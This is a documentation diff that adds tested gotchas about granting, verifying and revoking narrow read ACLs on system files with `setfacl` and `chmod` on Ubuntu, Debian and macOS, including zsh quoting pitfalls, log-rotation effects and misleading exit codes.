@@ -625,13 +867,18 @@ The narrowest possible write grant is no write grant, and it's worth reaching fo
 
 ## The Gotchas
 
+<Verified date="2026-09" method="tested" />
+
 Found by running the commands, not by reading the manual page.
+Every item here was reproduced on real hardware: the macOS ones on macOS 26.6.2 on `arm64`, the Linux ones on a Debian 13 Raspberry Pi on `arm64`, both on 2026-09-02.
 
 **Directory grants need a capital `X`, not a lowercase `r`, on Ubuntu, and neither one opens the files inside.**
 A lowercase `r` on a directory strips the search bit, because a named-user ACL entry *replaces* what the account was getting from "other," it doesn't add to it, so the account can list names but can't `cd` in or reach anything below.
 Grant `rX` instead (`X` sets execute only on directories and files that already have it set for someone), and the account can traverse the directory and reach files by name.
 It still can't read their contents.
 That takes a separate grant on the files themselves: `-R` for what's there now, a default ACL for what shows up later.
+This is easy to hit without recognizing it, because `setfacl -R` applies the lowercase `r` to the directory as well as to the files under it, so a single recursive grant can leave every file correctly granted and still unreachable.
+Step 4 of the Ubuntu worked example shows that happening on `/etc/sudoers.d/`.
 
 **Per-file grants on rotated logs die at the next `logrotate` run, on Ubuntu.**
 Rotation creates a new inode for the fresh log file.
@@ -646,6 +893,7 @@ sudo setfacl -m "d:u:${USER}:r" /var/log
 This one is easy to lose an afternoon to.
 zsh treats an unbraced `$USER` immediately followed by `:r` as a parameter-expansion modifier, borrowed from history substitution, and silently eats the suffix, even inside double quotes.
 `u:$USER:r` quietly becomes `u:myuser`, not `u:myuser:r`.
+The modifier is real and it is doing its documented job, which is why nothing warns you: `:r` means "remove the extension," so a `$USER` of `host.example.com` followed by `:r` expands to `host.example` rather than being truncated at random.
 `setfacl` rejects that outright, `Option -m incomplete`, exit code 2, it doesn't grant something broken or grant nothing silently.
 The danger is where the error lands: buried in the middle of a longer block of commands, scrolled past, while the actual symptom, a file that should be readable and isn't, shows up later, somewhere else, with no obvious link back to a quoting bug two commands earlier.
 On a real Raspberry Pi running this exact command through oh-my-zsh, the symptom wasn't even a clean error: the mangled command silently blew past Claude Code's own 120-second tool timeout and got demoted to a background task, which looked like an unrelated permissions problem until it was traced back to the quoting bug one layer down.
@@ -713,6 +961,8 @@ Check it before spending a grant on a file that was never going to open.
 
 ## Verify and Revoke
 
+<Verified date="2026-09" method="tested" />
+
 Confirm any grant, read or write, before you trust it.
 
 <Steps>
@@ -745,6 +995,16 @@ Confirm any grant, read or write, before you trust it.
    ```shell
    sudo setfacl -x "u:${USER}" /etc/hosts
    ```
+
+   A default ACL is a separate entry and `-x` does not touch it, which matters if you set one on a directory to survive log rotation.
+   Clearing those takes `-k`, on the directory:
+
+   ```shell
+   sudo setfacl -k /var/log
+   ```
+
+   `setfacl -x` also exits `0` when the name it was given was never granted anything on that file, so the exit code confirms the command parsed, not that anything was removed.
+   Check `getfacl` afterward for both named entries and `default:` lines.
 
    macOS needs more care than the parallel command suggests.
    `chmod -a` subtracts the permissions you name from a matching entry, it doesn't delete the entry, and it exits `0` whether or not anything matched:
